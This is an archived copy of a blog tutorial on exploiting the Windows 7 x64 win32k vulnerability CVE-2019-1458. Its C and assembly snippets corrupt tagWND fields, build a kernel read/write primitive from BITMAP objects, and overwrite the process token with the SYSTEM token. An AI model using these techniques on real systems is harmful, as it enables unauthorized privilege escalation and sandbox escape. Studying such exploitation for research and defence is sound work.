{
    "id": "8ccc645c-5678-459a-9c65-a11e441747b7",
    "created_at": "2023-01-12T15:03:01.232576Z",
    "updated_at": "2025-03-27T02:05:19.352938Z",
    "deleted_at": null,
    "sha1_hash": "20c6fed3a7c7f0e4c60f495f8a1ba11ab7254235",
    "title": "2020-06-03 - The WizardOpium LPE- Exploiting CVE-2019-1458",
    "authors": "",
    "file_creation_date": "2022-05-27T22:07:22Z",
    "file_modification_date": "2022-05-27T22:07:22Z",
    "file_size": 308193,
    "plain_text": "# The WizardOpium LPE: Exploiting CVE-2019-1458\n\n**[byteraptors.github.io/windows/exploitation/2020/06/03/exploitingcve2019-1458.html](https://byteraptors.github.io/windows/exploitation/2020/06/03/exploitingcve2019-1458.html)**\n\nByteRaptors June 3, 2020\n\nJun 3, 2020\n\nIn December Kaspersky published a blog post about a 0day exploit spotted in the wild, CVE2019-1458.\n\nThe vulnerability is in the win32k.sys driver and can allow an attacker to elevate an\napplication privileges to SYSTEM, potentially causing a sandbox escape.\n\n[I highly recommend you to first read this article which contains a very good description of all](https://github.com/piotrflorczyk/cve-2019-1458_POC)\nthe nitty-gritty details of this vulnerability since in this post I will focus only on the exploitation\nof the vulnerability itself on a Window 7 x64 machine.\n\n## Why just Windows 7?\n\nIn my personal opinion, it makes much more sense for a person who is just getting started\nwith Windows Kernel Exploitation to develop the exploit for Windows 7 instead of dealing\nwith Windows 10 mitigations.\n\nMoreover, since the approach I chose to exploit this vulnerability involves building a Kernel\nWrite What Where primitive to carry out a data-only attack, it will be pretty easy to make this\nexploit work against a Windows 8.1 machine.\n\n## Let’s get started\n\nCVE-2019-1458 is an arbitrary kernel pointer dereference vulnerability. In other words, an\nattacker has the possibility to trigger the dereference of a kernel memory address of his\nchoice.\n\nIf you have read the article linked above, you will know this vulnerability has some\nconstraints:\n\nIt is possible to trigger the vulnerability only once per system reboot.\nThe attacker has no control over the content of the value being assigned to the\ndereferenced pointer.\n\nLet’s start with getting a clear idea of what we have and what we want to achieve: we have\nthe possibility to trigger the dereference of a kernel memory address of our choice and we\nwant to elevate our privileges to SYSTEM, possibly even escaping a browser sandbox.\n\n\n-----\n\nBut how do we actually achieve this? Most of modern Windows Kernel Exploitation\ntechniques strive to get a Write What Where kernel primitive (hereinafter WWW Primitive):\nthe ability to arbitrarily read and write to kernel memory. Usually building a WWW primitive\nconsists in triggering a kernel vulnerability with the goal of corrupting specific Windows\nKernel objects fields.\n\nOur journey to successfully exploit this vulnerability can be divided into the following parts:\n\nUnderstanding the pointer dereference.\nChoosing a suitable kernel structure whose fields we want to corrupt.\nDealing with KASLR.\nTriggering to vulnerability to corrupt the target structure.\nBuilding the WWW primitive.\nLeveraging the WWW primitive to elevate privileges.\nFixing corrupted kernel structure.\n\n## Understanding the pointer dereference\n\nAs already stated before, I highly recommend you to first read the analysis I linked you\nabove before keeping reading this article. In a nutshell, this vulnerability allows to overwrite\nthe pointer to a structure containing information about the Switch Window by calling the\nSetWindowLongPtr API. This pointer will be accessed during the execution of the\nxxxPaintSwitchWindow and will be dereferenced as you can see in the code below (the\npointer is present in the register RDI):\n```\nsub [rdi + 0x60], EBX\nadd [rdi + 0x68], EBX\nsub [rdi + 0x5C], ECX\nadd [rdi + 0x64],ECX\n\n```\nSince the pointer to this structure can be deliberately overwritten by an attacker, this code\nwill increment and decrement data pointed at four different offsets starting from the attackerprovided kernel address.\n\nLet’s see in the next section what we can do with this information!\n\n## Choosing a suitable target kernel structure\n\nUnfortunately, we do not have control over the values that will get assigned to our\ndereferenced pointer. For this reason, our best bet would be to leverage this vulnerability to\nmodify a field of a kernel object in such a way that we will be able to trigger an Out of Bound\nwrite access to some nearby object to develop a stronger primitive.\n\n\n-----\n\nThe technique I will use has been described by Saif El Sherei and relies on the fact that if an\nattacker is able to place two tagWND objects in memory one after another and then corrupt\nthe cbwndExtra field of the first tagWND object it will be possible to use the\nSetWindowLongPtr API on the tagWND whose cbwndExtra field has been corrupted to be\nable to write to the tagWND object placed next to the corrupted one.\n\nBut what is the tagWND? In a nutshell, the tagWND is a kernel structure which represents a\nWINDOW object in kernel memory.\n\n[You can find a very good description of the tagWND structure here .](https://www.geoffchappell.com/studies/windows/win32/user32/structs/wnd/index.htm)\n\nLet’s have a look at the tagWND on WinDBG:\n\nThe most interesting fields for us will be the strName and the cbwndExtra. For now, let’s\nfocus on the latter, representing the size of the extra memory area allocated after the window\ninstance.\n\nWhen creating a WINDOW, it is possible to specify the number of extra bytes to allocate after\nthe window instance, as you can see in the code snippet below:\n```\nWNDCLASSEXW* testClass =\n(WNDCLASSEXW*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(WNDCLASSEXW));\ntestClass->cbSize = sizeof(WNDCLASSEXW);\ntestClass->lpfnWndProc = (WNDPROC)DefWindowProcW;\ntestClass->lpszClassName = L\"TestClass\";\ntestClass->cbWndExtra = 0x1000;\nRegisterClassExW(testClass);\nCreateWindowExW(0, testClass->lpszClassName, L\"DummyName\", WS_OVERLAPPEDWINDOW,\nCW USEDEFAULT CW USEDEFAULT CW USEDEFAULT CW USEDEFAULT 0 0 0 0);\n\n```\n\n-----\n\nRunning this code will trigger the creation in kernel mode of a tagWND object having 0x1000\nas cbwndExtra field value!\n\nSince the SetWindowLongPtr function can be used to set a value at a specified offset in the\nextra window memory, if we manage to leverage the vulnerability in such a way that the\ncbwndExtra value of a tagWND object will be much higher than the original one, issuing a\ncall to the SetWindowLongPtr will result in an Out of Bound write, allowing us to further\ncorrupt other kernel structures.\n\n## Dealing with KASLR\n\nConsidering that we are dealing with an arbitrary pointer dereference, we will not need to\nperform some magic kernel pool feng-shui to accomplish our goal. In order to successfully\ncorrupt the cbwndExtra of our target tagWND object we will need to solve just two problems:\n\nGetting the tagWND object kernel address\nChoosing the right offset to trigger the dereference on\n\n**Getting the tagWND object kernel address**\n\nTo leak the tagWND kernel address we can use the well-known HMValidateHandle\ntechnique: since this function allows to map the tagWND object in the user mode memory\nspace, we will be able to get its kernel mode address and its field values.\n\nThis technique is extremely popular in the world of Windows Kernel Exploitation and a lot of\n[words have been spent on it, for more information about this topic just read here .](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf)\n\n**Choosing the right offset**\n\nThe arbitrary pointer dereference operates on four offsets starting from the attacker-provided\naddress: 0x60, 0x68,0x5C and 0x64. The small problem that arises is that since our target\ncbwndExtra field is located at offset 0xE8, we can’t just trigger the vulnerability by providing\nthe tagWND kernel address since the triggered arbitrary dereference will not access offset\n0xE8.\n\nLet’s look at the first dereference:\n```\nsub [rdi + 0x60], ebx\n\n```\nSince 0x88 + 0x60 = 0xE8 we can just trigger the vulnerability by providing this address:\n```\ntagWNDKernelAddress + 0x88\n\n```\nIn this way, the value of the cbwndExtra field will be decremented and become less than\nzero, allowing us to get a partial write primitive.\n\n\n-----\n\nThere is still a problem: since it is not the only dereference present, other fields of the\ntagWND structure will be corrupted, resulting in a BSOD as soon as we close the application.\nSince the BSOD will be triggered only after closing the application, we will take care of this\nissue in the last chapter of our adventure.\n\n## Triggering the vulnerability\n\nWe are now ready to trigger the vulnerability!\n\nThe process of triggering the vulnerability can be divided into the following parts:\n\nTriggering the creation of two adjacent tagWND objects.\nCreating the target Window and initializing it.\nSetting the pointer we want to trigger the arbitrary dereference on.\nCreating the special Switch Window.\nSimulating the pressing of the ALT keyboard button\nSending the WM_ERASEBKGND to the target Window\n\n**Triggering the creation of two adjacent tagWND Objects**\n\nThis part is actually not related to the vulnerability itself, but we will need it to successfully\nexploit the vulnerability.\n\nSince our goal is to trigger the vulnerability to corrupt the cbwndExtra field of a tagWND\nobject, we will need to make sure that we will create two adjacent tagWND structure since\nthis approach will give us just a partial write primitive!\n\nTo solve this problem, we can just create a lot of Window objects, leak their addresses using\nthe HMValidateHandle technique and just look at the distance between the created objects to\nchoose the nearest between each other ones.\n\nOnce we found two adjacent tagWND object we can continue to the next part.\n\n**Creating and initializing the target Window**\n\nWe will now need to create the Window object which will be used to trigger the vulnerability.\nTo accomplish this task, we can just register a Window class with a cbwndExtra field of 0x8\nand then use the CreateWindowEx API to create our target Window.\n\nThen we will just initialize the target window by calling the NtUserMessageCall with the\nWM_CREATE param.\n```\nNtUserMessageCall(targetWindow,0x1,0,0,0,0xE0,1); //0x1 is WM_CREATE\n\n```\n\n-----\n\nBut how do we actually call the NtUserMessageCall function? We will need to issue a\nsyscall! Luckily for us, at [this address we can find the list of all Windows syscalls with their](https://github.com/j00ru/windows-syscalls)\nnumber: as we can see, the syscall number for NtUserMessageCall is 0x1007 on Windows 7\nx64.\n\nThere is still a small problem we will need to solve: since we want to support execution from\nWow64 processes, we will need to support Wow64 syscalls as we can see in the snippets\nbelow:\n```\n_declspec(naked) NTSTATUS WINAPI NtUserMessageCallWow64(HWND, UINT, WPARAM, LPARAM,\nULONG_PTR, DWORD, BOOL)\n{\n     _asm{\n          mov eax, 0x1007;\n          xor ecx,ecx;\n          lea edx, dword ptr ss:[esp+0x4];\n          call dword ptr fs:[0xC0];\n          add esp,0x4;\n          retn 0x1C;\n     }\n}\nPUBLIC NtUserMessageCall\nNtUserMessageCall PROC\n  mov r10, rcx\n  mov eax,0x1007\n  syscall\n  ret\nNtUserMessageCall ENDP\n\n```\n**Setting the pointer we want to trigger the arbitrary dereference on**\n\nIt’s now time to call the SetWindowLongPtr on the target Window specifying the address of\nthe first of the two created adjacent tagWND objects as already explained before.\n```\nSetWindowLongPtr(targetWindow,0,(ULONG)(tagWNDKernelAddress + 0x88));\nSetWindowLongPtr(targetWindow,4,(ULONG)(tagWNDKernelAddress >> 32));\n\n```\nIn this way the offset 0x88 of the tagWNDKernelAddress will be dereferenced in the\nxxxPaintSwitchWindow function after sending the WM_ERASEBKGND message as we will\nsee in the next sections.\n\nIf we pay attention to the code above, we will notice that the SetWindowLongPtr function is\nactually called two times: this approach is used to support execution from Wow64 processes\nsince it will not be possible to set a ULONG64 address by calling the SetWindowLongPtr\nfunction just once from a 32 bit process.\n\n**Creating the special Switch Window**\n\n\n-----\n\nCreating this Window will be crucial to execute the code path to trigger the vulnerability as\nyou can read in the detailed analysis of the vulnerability I linked above.\n```\nHMODULE currMod = GetModuleHandleA(NULL);\nHWND taskSwitchWnd = CreateWindowExA(0, \"#32771\", NULL, 0, 0, 0, 0, 0, 0, 0, currMod,\n0);\n\n```\n**Simulating the pressing of the ALT keyboard button**\n\nTo trigger the vulnerability, we will need to simulate the pressing of the ALT keyboard button.\nLet’s take a better look at the pseudo C code checking for the status of the ALT button:\n```\nif(*((DWORD*)(arbitraryKernelAddress + 0x6C))) == 0){\n     if(GetAsyncKeyState(VK_MENU) >= 0)\n          goto fail\n}\nelse{\n     if(GetKeyState(VK_MENU) >= 0)\n          goto fail\n}\n\n```\nThe function will compare to zero a DWORD value located at the offset 0x6C starting from\nthe attacker-provided kernel address and will determine according to the comparison result\nwhich function to use to get the status of the ALT button. What are the differences between\nthe GetAsyncKeyState and GetKeyState functions?\n\nThe GetKeyState function will get the key status returned from the thread’s message queue,\nwhile the GetAsyncKeyState will determine whether the key was pressed since the last call\nto GetAsyncKeyState.\n\nSince we decided to provide the address of our target tagWND structure + 0x88, the\nvulnerable function will check the DWORD at offset 0xF0 (0x88 + 0x6C) of the target\ntagWND address.\n\nThe DWORD at address 0xF0 will contain the lowest 32 bits of the spwndLastActive field of\nthe target tagWND object.\n\nSince we can get a read-only copy of the tagWND object by calling the HMValidateHandle\nfunction, we can just check the value of the DWORD at the offset 0xF0 to determine how to\nsimulate the pressing of the ALT button.\n\n\n-----\n\n```\nif( ((DWORD )(tagWNDUsermodeCopy + 0xF0))  0){\n     INPUT inputData = { 0 };\n     inputData.type = INPUT_KEYBOARD;\n     inputData.ki.wVk = VK_MENU;\n     inputData.ki.dwFlags = 0;\n     SendInput(1, &inputData, sizeof(inputData));\n}\nelse{\n     BYTE keyState[256];\n     GetKeyboardState(keyState);\n     keyState[VK_MENU] |= 0x80;\n     SetKeyboardState(keyState);\n}\n\n```\n**Sending the WM_ERASEBKGND to the target Window**\n\nSo here we are! We will now send the WM_ERASEBKGND message to the target Window\nby calling the NtUserMessageCall API. Sending this message will trigger the execution of the\nxxxPaintSwitchWindow on the vulnerable code path where the arbitrary pointer dereference\noccurs!\n```\nNtUserMessageCall(targetWindow,0x14,0,0,0,0xE0,1); //0x14 is WM_ERASEBKGND\n\n```\nLet’s take a look at our target tagWND object before sending the WM_ERASEBKGND\nmessage:\n\n\n-----\n\nIf we pay attention to the pictures above, we will see that the value of the cbwndExtra field is\n0x3000 (12288 in decimal).\n\nLet’s now have a look at the very same kernel address after sending the\nWM_ERASEBKGND message:\n\n\n-----\n\nThe value of the cbwndExtra has become much bigger than the original one! As already\nstated before, by corrupting the cbwndExtra field of a tagWND object we will be able to turn a\ncall to the SetWindowLongPtr API into a partial kernel write primitive.\n\nWe will now see in the next section how to turn this partial write primitive into something\nmore powerful.\n\n## Building the WWW Primitive\n\nThe cbwndExtra of our corrupted tagWND is now very big. What does this imply? By issuing\na call to the SetWindowLongPtr API and specifying the HWND of our corrupted tagWND\nobject we will be able to trigger an Out-of-Bound write and write across the extra memory of\nour tagWND object.\n\nThe only thing that we must take into account is that we will need to calculate the distance\nbetween the beginning of our corrupted tagWND extra memory and the field of the adjacent\n[tagWND structure we want to corrupt! A nice write-up of this technique can be found here](https://blog.trendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/)\n\n[Moreover, before keeping reading I strongly recommend you to first read this article if you](https://www.coresecurity.com/core-labs/articles/abusing-gdi-for-ring0-exploit-primitives)\nare not familiar with using BITMAP objects to build WWW primitives.\n\nOur plan to build our WWW primitive will look like this:\n\nCreate two BITMAP objects (Manager and Worker) and leak their kernel addresses.\nUse our partial write primitive to set the strName field of the adjacent tagWND object to\nthe address of our Manager BITMAP.\nCall the SetWindowText on the adjacent tagWND object by setting the window text as\nthe address of the Worker BITMAP.\n\n**Creating two BITMAP Objects and leaking their addresses**\n\nConsidering the fact that we are exploiting this vulnerability on a Windows 7 x64 machine,\ncreating BITMAP objects and leaking their addresses will be pretty trivial since it can be\naccomplished by just accessing the GdiSharedHandleTable.\n\nFor more information about this topic, just read the CoreSecurity article I linked above.\n\n**Corrupting the strName field**\n\nThe strName field of a tagWND object is a LARGE_UNICODE_STRING structure containing\na pointer to a buffer in which it is stored the name of the Window object.\n\nThis is the buffer the function NtUserDefSetText will ultimately operate on. In other words, if\nwe are able to modify the address contained in the strName.Buffer field of a tagWND object,\nthe NtUserDefSetText function will write data to the specified address!\n\n\n-----\n\nTechnically we could build a full Write What Where primitive just by leveraging\nNtUserDefSetText for the write primitive and InternalGetWindowText for the read primitive but\nsince I wanted to show you how to build a WWW primitive by abusing GDI objects, let’s use\nthe SetWindowLongPtr function to overwrite the strName.Buffer field of the adjacent tagWND\nobject with the address of the pvScan0 field of our Manager Bitmap object.\n\nTo corrupt the strName field of our target adjacent object, we will just need to call the\nSetWindowLongPtr API with the HWND of the corrupted tagWND object and the right offset\nas already explained above.\n```\nSetWindowLongPtr(corruptedWindowHWND,offsetDelta,(ULONG)(pManagerBitmapAddress));\nSetWindowLongPtr(corruptedWindowHWND,offsetDelta + 0x4,(ULONG)(pManagerBitmapAddress\n>> 32));\n\n```\n**Modifying the Manager Object pvscan0 field**\n\nSince the strName.Buffer field of the adjacent tagWND object is set to the address of the\npvscan0 field of the Manager object, we will now call the SetWindowTextW API to actually\noverwrite the value of the Manager’s pvscan0 field.\n\nBy specifying the address of the Worker Bitmap object as shown in the code below, the\npvScan0 field of the Manager BITMAP will have the value of the address of the pvscan0\naddress of the Worker Bitmap. In other words, we will be then able to arbitrarily read and\nwrite the kernel memory by calling the GetBitmapBits/SetBitmapBits APIs on the corrupted\nBITMAP objects!\n```\nwchar_t* inputText =\n(wchar_t*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,5*sizeof(wchar_t));\ninputText[3] = (pWorkerBitmapAddress >> 48) & 0xFFFF;\ninputText[2] = (pWorkerBitmapAddress >> 32) & 0xFFFF;\ninputText[1] = (pWorkerBitmapAddress >> 16) & 0xFFFF;\ninputText[0] = (pWorkerBitmapAddress >> 0) & 0xFFFF;\nSetWindowTextW(adjacentWindowHwnd, (LPWSTR)inputText);\n\n```\nCongratulations! We have built a full WWW primitive which will allow us to read and write to\nany address in kernel memory!\n\n## Elevating privileges\n\nOnce we have a full WWW primitive, there are a lot of ways to elevate our privileges. In this\narticle, we will focus on one of the most common approaches: stealing the SYSTEM TOKEN.\n\nEvery process running on the system is represented in kernel memory in a EPROCESS\nstructure which describes several properties of the process, such as its process image name\nand process security context.\n\n\n-----\n\nOne of the EPROCESS structure most interesting fields is the TOKEN structure: a kernel\nmemory structure describing the process token privileges.\n\nA common strategy used when exploiting a Windows Kernel vulnerability is to replace the\nTOKEN of the process in which the exploit code will we executed with the TOKEN of the\nSYSTEM process. The replacing of our process TOKEN with the SYSTEM’s token will give\nus SYSTEM privileges on the targeted machine, allowing us to successfully escape the\nbrowser sandbox! Sounds good, right?\n\nSince we have already built our WWW primitive, we will just need to understand how to get\nthe kernel address of the SYSTEM EPROCESS structure and the kernel address of our\nprocess EPROCESS structure.\n\n**Getting EPROCESS address**\n\nA very common approach to get the address to the System EPROCESS structure is to get\nthe offset to the PsInitialSystemProcess variable by loading in memory the ntoskrnl.exe\nexecutable and then getting the kernel address of ntoskrnl.exe by calling the\nEnumDeviceDrivers function.\n\nUnfortunately this approach will not work when exploiting the vulnerability from a Wow64\nprocess!\n\nIn order to achieve full coverage, we will need to use another approach!\n\nLet’s have a look at the THRDESKHEAD object on WinDBG, the header for user objects that\ncan be owned by a thread and are specific to a desktop (it begins the tagWND structure):\n\nIf we see the picture above, we can get a pointer to a tagTHREADINFO structure at offset\n0x10 of the tagWND.\n\nTo get this pointer, we can just use our kernel Read primitive:\n```\nULONG64 tagTHREADINFO = 0;\nreadQWORD(tagWNDKernelAddress + 0x10,&tagTHREADINFO);\n\n```\nThe tagTHREADINFO is a pretty complex structure, but we will not need to fully understand\nit to successfully exploit this vulnerability.\n\n\n-----\n\nIf we look at offset 0x158 we will see a pointer to a tagPROCESSINFO structure.\n```\nULONG64 tagTHREADINFO = 0;\nreadQWORD(tagWNDKernelAddress + 0x10,&tagTHREADINFO);\nULONG64 tagPROCESSINFOAddress = 0;\nreadQWORD(tagTHREADINFO + 0x158,&tagPROCESSINFOAddress);\n\n```\n\n-----\n\nAs you can see in the picture above, the first field of the tagPROCESSINFO is a pointer to\nthe current process EPROCESS structure!\n\nThis means that we can just use our kernel Read Primitive to access the first field of the\ntagPROCESSINFO structure and obtain the address of our process’ EPROCESS structure!\n```\nULONG64 tagTHREADINFO = 0;\nreadQWORD(tagWNDKernelAddress + 0x10,&tagTHREADINFO);\nULONG64 tagPROCESSINFOAddress = 0;\nreadQWORD(tagTHREADINFO + 0x158,&tagPROCESSINFOAddress);\nULONG64 eprocessAddress = 0;\nreadQWORD(tagPROCESSINFOAddress,&eprocessAddress);\n\n```\nIn order to get the address of the SYSTEM EProcess structure, we will need to iterate the\nLIST_ENTRY ActiveProcessLinks field starting from our process’ EPROCESS structure\nlooking for an EPROCESS structure having PID 0x4 (the SYSTEM process) as you can see\nin the example code below:\n\n\n-----\n\n```\nULONG64 getCurrentProcessEProcess(ULONG64 tagWNDAddress)\n{\n     ULONG64 tagTHREADINFO = 0;\n     readQWORD(tagWNDAddress + 0x10,&tagTHREADINFO);\n     ULONG64 tagPROCESSINFO = 0;\n     readQWORD(tagTHREADINFO + 0x158,&tagPROCESSINFO);\n     ULONG64 eprocessAddress = 0;\n     readQWORD(tagPROCESSINFO,&eprocessAddress);\n     return eprocessAddress;\n}\nvoid setSystemToken(ULONG64 tagWNDAddress)\n{\n     ULONG64 currentEProcess = getCurrentProcessEProcess(tagWNDAddress);\n     ULONG64 tempEProcess = currentEProcess;\n     ULONG64 currentProcID = 0;\n     readQWORD(currentEProcess + 0x180,&currentProcID);\n     if(currentProcID != GetCurrentProcessId())\n          return;\n     while(TRUE)\n     {\n          ULONG64 activeProcessLinks = 0;\n          readQWORD(tempEProcess + 0x188,&tempEProcess); //0x188 is the offset\nof ActiveProcessLinks on Windows 7 x64\n          tempEProcess -= 0x188;\n          ULONG64 uniqueProcessID = 0;\n          readQWORD(tempEProcess + 0x180,&uniqueProcessID); // 0x180 is the\noffset of UniqueProcessID on Windows 7 x64\n          if(uniqueProcessID == 4)\n              break;\n     }\n     ULONG64 systemToken = 0;\n     readQWORD(tempEProcess + 0x208,&systemToken); //0x208 is the offset of TOKEN\non Windows 7 x64\n     writeQWORD(currentEProcess + 0x208,systemToken);\n\n```\n\n-----\n\n```\n}\n\n```\nOnce we have all the needed addresses, we will just need to use our Read primitive to steal\nthe TOKEN of the SYSTEM process and use our write primitive to overwrite our process\nTOKEN with the SYSTEM token we have just stolen!\n\nGreat! We are now SYSTEM! Unfortunately, as long as we will close our application, the\nsystem will crash!\n\n## Fixing corrupted tagWND structure\n\nIn the chapters before, I reminded you that the arbitrary dereference is triggered at four\ndifferent offsets. In other words, the cbwndExtra will not be the only tagWND field which will\nbe corrupted.\n\nSince the crash happens only after closing the application, we will just need to make sure to\nuse our WWW primitive to fix the corrupted addresses before terminating execution.\n\nIn order to achieve our goal, we will rely on the fact that the HMValidateHandle function will\ngive us read-only access to the tagWND kernel structure data, allowing us to save all the\nneeded values before corrupting them when triggering the vulnerability.\n\nLet’s take a look at the following pseudo C code which will make use of our WWW primitive\nto fix the corrupted structures:\n```\nwriteQWORD(corruptedWindowKernelAddress + 0xF0, spwndOriginal);\nwriteQWORD(corruptedWindowKernelAddress + 0xE0, originalValue);\nwriteQWORD(corruptedWindowKernelAddress + 0xD8, 0); // Sets to NULL the strName field\nwriteQWORD(adjacentWindowKernelAddress + 0xE0, 0);\n\n```\nAfter fixing this issue, our exploit will stop crashing the system after closing the application!\n\n## Conclusion\n\nI consider CVE-2019-1458 a great vulnerability to get started with Windows Kernel\nExploitation since it is pretty easy to exploit. I think I will publish in the next weeks another\narticle explaining how to exploit this vulnerability on Windows 10. Full source code to exploit\nthis vulnerability will be published in the next days!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-03 - The WizardOpium LPE- Exploiting CVE-2019-1458.pdf"
    ],
    "report_names": [
        "2020-06-03 - The WizardOpium LPE- Exploiting CVE-2019-1458.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535781,
    "ts_updated_at": 1743041119,
    "ts_creation_date": 1653689242,
    "ts_modification_date": 1653689242,
    "files": {
        "pdf": "https://archive.orkl.eu/20c6fed3a7c7f0e4c60f495f8a1ba11ab7254235.pdf",
        "text": "https://archive.orkl.eu/20c6fed3a7c7f0e4c60f495f8a1ba11ab7254235.txt",
        "img": "https://archive.orkl.eu/20c6fed3a7c7f0e4c60f495f8a1ba11ab7254235.jpg"
    }
}